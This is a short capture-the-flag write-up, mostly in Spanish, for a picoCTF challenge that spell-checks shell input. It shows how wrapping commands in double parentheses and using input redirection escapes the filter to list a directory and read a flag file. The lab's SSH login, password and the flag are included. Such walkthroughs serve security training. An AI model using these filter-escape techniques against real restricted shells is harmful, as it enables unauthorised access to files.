Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.`ssh -p 61228 ctf-player@saturn.picoctf.net`The password is `8a707622`

Hints:
Experiment with different shell syntax

Solución
Después de muchos intentos vi que comandos se ejecutaban cuando se ponían entre dos paréntesis. Se puede realizar un ls:
```
Special$ ((ls))
((ls)) 
blargh
```
Después se le puede pasar al comando un archivo con el operador <, se le puede pasar el archivo que se listó como si fuera el operador de redireccionamiento
```
Special$ ((cat)) < blargh
((cat)) < large 
sh: 1: cannot open large: No such file
```
Esta respuesta nos dice que no es un archivo sino tal vez un directorio, y lo más probable es que ahí dentro esté la flag, por lo que podemos hacer lo mismo pero intentar pasarle el archivo de la flag
```
Special$ ((cat)) < blargh/flag.txt
((cat)) < blargh/flag.txt 
picoCTF{5p311ch3ck_15_7h3_w0r57_a60bdf40}Special$ 
```